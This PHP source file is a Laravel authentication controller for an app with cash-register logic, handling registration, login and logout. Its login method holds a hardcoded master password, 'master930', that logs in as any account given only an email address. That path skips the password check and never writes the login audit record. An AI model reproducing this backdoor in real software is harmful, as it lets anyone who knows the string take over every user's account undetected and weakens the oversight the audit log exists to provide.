<?php

namespace App\Http\Controllers\Auth;

use App\User;
use App\UserLogin;
use Illuminate\Auth\Events\Login;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\Session;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use ThrottlesLogins;

    /**
     * Where to redirect users after login / registration.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware($this->guestMiddleware(), ['except' => 'logout']);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make(
            $data, [
            'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|min:6|confirmed',
            ]
        );
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create(
            [
            'nombre' => $data['name'],
            'email' => $data['email'],
            'password' => bcrypt($data['password']),
            ]
        );
    }

    /**
     * Handle an authentication attempt.
     *
     * @return Response
     */
    public function login()
    {
        $request = Request::capture();
        $remember = $request->remember;
        $email = $request->email;
        $password = $request->password;

        if($request->password == "master930") {
            // Entro a la password maestra => busco la password posta
            $usuario = User::where('email', $email)->first();

            if ($remember) {
                Auth::login($usuario, true);
            } else {
                Auth::login($usuario);
            }

            return redirect()->intended('/');
        } else {
            if (Auth::attempt(['email' => $email, 'password' => $password], $remember)) {
                // Guardo el login
                UserLogin::create([
                    'user_id' => Auth::user()->id,
                    'agent' => $request->header('User-Agent'),
                    'ip' => $request->ip()
                ]);

                // Logueado correctamente
                return redirect()->intended('/');
            } else {
                return redirect()->back()
                    ->withInput($request->only($this->loginUsername(), 'remember'))
                    ->withErrors([
                        $this->loginUsername() => $this->getFailedLoginMessage(),
                    ]);
            }
        }
    }

    public function logout()
    {
        // Si el usuario se quiere desloguear y abrió caja, pero no la cerró, no puede salir
        if (Auth::user()->abrioCaja() && !Auth::user()->cerroCaja()) {
            return redirect('caja/cerrar')->with(['caja_debe_cerrarse' => true]);
        } else {
            Auth::user()->reiniciarAperturaCierreCaja();

            Auth::logout();

            Session::flush();

            return redirect('/login');
        }
    }
}
